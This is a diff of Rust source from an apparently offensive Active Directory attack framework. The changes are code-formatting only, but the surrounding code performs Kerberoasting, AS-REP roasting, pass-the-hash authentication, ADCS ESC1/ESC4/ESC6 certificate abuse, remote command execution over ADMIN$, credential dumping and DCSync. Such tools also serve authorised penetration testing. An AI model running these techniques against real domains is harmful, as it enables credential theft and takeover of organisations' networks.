@@ -13,11 +13,11 @@ use chrono::Utc;
 use colored::Colorize;
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::proto::{kerberos, ldap, smb::SmbSession};
+use overthrone_hunter::HuntConfig;
 use overthrone_hunter::coerce::{CoerceConfig, CoerceMethod};
 use overthrone_hunter::constrained::ConstrainedConfig;
 use overthrone_hunter::rbcd::RbcdConfig;
 use overthrone_hunter::unconstrained::UnconstrainedConfig;
-use overthrone_hunter::HuntConfig;
 use std::path::PathBuf;
 use tracing::{debug, info, warn};
 // ═══════════════════════════════════════════════════════════
@@ -264,7 +264,10 @@ pub async fn execute_step(
 /// work — the password field holds an NT hash, not a cleartext password.
 /// In that case we check for a known cleartext among cracked credentials
 /// or return a clear error instead of sending garbage to the DC.
-async fn ldap_connect(ctx: &ExecContext, state: &EngagementState) -> std::result::Result<ldap::LdapSession, StepResult> {
+async fn ldap_connect(
+    ctx: &ExecContext,
+    state: &EngagementState,
+) -> std::result::Result<ldap::LdapSession, StepResult> {
     let (user, secret, use_hash) = ctx.effective_creds();
 
     // If the operator authenticated with an NT hash, LDAP simple bind will
@@ -272,7 +275,10 @@ async fn ldap_connect(ctx: &ExecContext, state: &EngagementState) -> std::result
     let password: String = if use_hash {
         // Check cracked / known cleartext passwords
         if let Some(cleartext) = state.cracked.get(user) {
-            debug!("LDAP: using cracked cleartext for {} instead of NT hash", user);
+            debug!(
+                "LDAP: using cracked cleartext for {} instead of NT hash",
+                user
+            );
             cleartext.clone()
         } else if let Some(cred) = state.credentials.get(user) {
             if cred.secret_type == SecretType::Password {
@@ -306,14 +312,7 @@ async fn ldap_connect(ctx: &ExecContext, state: &EngagementState) -> std::result
         secret.to_string()
     };
 
-    match ldap::LdapSession::connect(
-        &ctx.dc_ip,
-        &ctx.domain,
-        user,
-        &password,
-        ctx.use_ldaps,
-    )
-    .await
+    match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, &password, ctx.use_ldaps).await
     {
         Ok(conn) => Ok(conn),
         Err(e) => Err(StepResult {
@@ -333,7 +332,10 @@ async fn ldap_connect(ctx: &ExecContext, state: &EngagementState) -> std::result
 /// When `use_hash` is true, calls `SmbSession::connect_with_hash()` instead
 /// of `SmbSession::connect()` so the NT hash is used for NTLMv2 auth
 /// rather than being sent as a literal password string.
-async fn smb_connect(ctx: &ExecContext, target: &str) -> std::result::Result<SmbSession, StepResult> {
+async fn smb_connect(
+    ctx: &ExecContext,
+    target: &str,
+) -> std::result::Result<SmbSession, StepResult> {
     let (user, secret, use_hash) = ctx.effective_creds();
     let result = if use_hash {
         SmbSession::connect_with_hash(target, &ctx.domain, user, secret).await
@@ -379,9 +381,10 @@ async fn exec_enumerate_users(ctx: &ExecContext, state: &mut EngagementState) ->
             && !u.sam_account_name.ends_with("$")
         {
             state.kerberoastable.push(u.sam_account_name.clone());
-            state
-                .spn_map
-                .insert(u.sam_account_name.clone(), u.service_principal_names.clone());
+            state.spn_map.insert(
+                u.sam_account_name.clone(),
+                u.service_principal_names.clone(),
+            );
         }
         if u.dont_req_preauth {
             state.asrep_roastable.push(u.sam_account_name.clone());
@@ -792,7 +795,12 @@ async fn exec_kerberoast(
         for spn in &spns {
             match kerberos::kerberoast(&ctx.dc_ip, &tgt, spn).await {
                 Ok(hash) => {
-                    info!("  {} Kerberoast hash: {} ({})", "✓".green(), account.bold(), spn);
+                    info!(
+                        "  {} Kerberoast hash: {} ({})",
+                        "✓".green(),
+                        account.bold(),
+                        spn
+                    );
                     state.roast_hashes.push(hash.hash_string.clone());
                     hash_count += 1;
                     break; // One hash per account is sufficient
@@ -816,7 +824,11 @@ async fn exec_kerberoast(
             .open(&hash_file)
         {
             use std::io::Write;
-            for h in state.roast_hashes.iter().skip(state.roast_hashes.len().saturating_sub(hash_count)) {
+            for h in state
+                .roast_hashes
+                .iter()
+                .skip(state.roast_hashes.len().saturating_sub(hash_count))
+            {
                 let _ = writeln!(f, "{}", h);
             }
             info!(
@@ -882,7 +894,11 @@ async fn exec_asrep_roast(
             .open(&hash_file)
         {
             use std::io::Write;
-            for h in state.roast_hashes.iter().skip(state.roast_hashes.len().saturating_sub(hash_count)) {
+            for h in state
+                .roast_hashes
+                .iter()
+                .skip(state.roast_hashes.len().saturating_sub(hash_count))
+            {
                 let _ = writeln!(f, "{}", h);
             }
             info!(
@@ -1288,17 +1304,18 @@ async fn exec_adcs_esc1(
     target_upn: &str,
 ) -> StepResult {
     // Auto-discover template + CA if not specified
-    let (real_template, real_ca, real_upn) = match resolve_adcs_params(ctx, state, template, ca, target_upn).await {
-        Ok(params) => params,
-        Err(msg) => {
-            return StepResult {
-                success: false,
-                output: msg,
-                new_credentials: 0,
-                new_admin_hosts: 0,
-            };
-        }
-    };
+    let (real_template, real_ca, real_upn) =
+        match resolve_adcs_params(ctx, state, template, ca, target_upn).await {
+            Ok(params) => params,
+            Err(msg) => {
+                return StepResult {
+                    success: false,
+                    output: msg,
+                    new_credentials: 0,
+                    new_admin_hosts: 0,
+                };
+            }
+        };
 
     let ca_server = real_ca.split('\\').next_back().unwrap_or(&real_ca);
     let exploiter = match overthrone_core::adcs::Esc1Exploiter::new(ca_server) {
@@ -1399,11 +1416,7 @@ async fn exec_adcs_esc4(
     };
 
     let (user, _pass, _) = ctx.effective_creds();
-    let mut target = overthrone_core::adcs::Esc4Target::new(
-        &real_template,
-        &ctx.domain,
-        user,
-    );
+    let mut target = overthrone_core::adcs::Esc4Target::new(&real_template, &ctx.domain, user);
 
     // Resolve template DN via LDAP
     let mut conn = match ldap_connect(ctx, state).await {
@@ -1421,8 +1434,7 @@ async fn exec_adcs_esc4(
             );
 
             // Now try ESC1 with the modified template
-            let esc1_result =
-                exec_adcs_esc1(ctx, state, &real_template, "", "").await;
+            let esc1_result = exec_adcs_esc1(ctx, state, &real_template, "", "").await;
 
             // Restore the template
             if let Err(e) = target.restore(&mut conn, None).await {
@@ -1453,17 +1465,18 @@ async fn exec_adcs_esc6(
     ca: &str,
     target_upn: &str,
 ) -> StepResult {
-    let (real_template, real_ca, real_upn) = match resolve_adcs_params(ctx, state, template, ca, target_upn).await {
-        Ok(params) => params,
-        Err(msg) => {
-            return StepResult {
-                success: false,
-                output: msg,
-                new_credentials: 0,
-                new_admin_hosts: 0,
-            };
-        }
-    };
+    let (real_template, real_ca, real_upn) =
+        match resolve_adcs_params(ctx, state, template, ca, target_upn).await {
+            Ok(params) => params,
+            Err(msg) => {
+                return StepResult {
+                    success: false,
+                    output: msg,
+                    new_credentials: 0,
+                    new_admin_hosts: 0,
+                };
+            }
+        };
 
     // Use any template with Client Auth EKU (not just ESC1-vulnerable ones)
     let ca_server = real_ca.split('\\').next_back().unwrap_or(&real_ca);
@@ -1482,7 +1495,11 @@ async fn exec_adcs_esc6(
     // Check if CA is vulnerable first
     match exploiter.check_vulnerable().await {
         Ok(true) => {
-            info!("  {} CA {} has EDITF_ATTRIBUTESUBJECTALTNAME2", "⚠".yellow(), ca_server);
+            info!(
+                "  {} CA {} has EDITF_ATTRIBUTESUBJECTALTNAME2",
+                "⚠".yellow(),
+                ca_server
+            );
         }
         Ok(false) => {
             return StepResult {
@@ -1726,14 +1743,24 @@ async fn exec_remote(
                 match smb.read_file("ADMIN$", &share_path).await {
                     Ok(data) if !data.is_empty() => {
                         output = String::from_utf8_lossy(&data).to_string();
-                        debug!("  Output captured on attempt {} ({} bytes)", attempt + 1, data.len());
+                        debug!(
+                            "  Output captured on attempt {} ({} bytes)",
+                            attempt + 1,
+                            data.len()
+                        );
                         break;
                     }
                     Ok(_) => {
-                        debug!("  Output file empty on attempt {}, retrying...", attempt + 1);
+                        debug!(
+                            "  Output file empty on attempt {}, retrying...",
+                            attempt + 1
+                        );
                     }
                     Err(_) if attempt < delays.len() - 1 => {
-                        debug!("  Output file not ready on attempt {}, retrying...", attempt + 1);
+                        debug!(
+                            "  Output file not ready on attempt {}, retrying...",
+                            attempt + 1
+                        );
                     }
                     Err(_) => {
                         output = "(output not captured — command may still be running)".to_string();
@@ -2113,7 +2140,7 @@ async fn exec_dump(
                         0
                     };
                     // Use actual user count from LDAP enum if available
-                    
+
                     if !state.users.is_empty() {
                         state.users.iter().filter(|u| u.enabled).count()
                     } else {
@@ -2510,7 +2537,10 @@ async fn exec_dcsync(
     // Fall back to computing ResponseKeyNT (NTLMv2 hash) from credentials.
     let (user, pass, _use_hash) = ctx.effective_creds();
     let session_key: Vec<u8> = if let Some(sk) = smb.session_key() {
-        info!("  Using NTLM session key from SMB auth ({} bytes)", sk.len());
+        info!(
+            "  Using NTLM session key from SMB auth ({} bytes)",
+            sk.len()
+        );
         sk
     } else {
         use hmac::{Hmac, Mac};
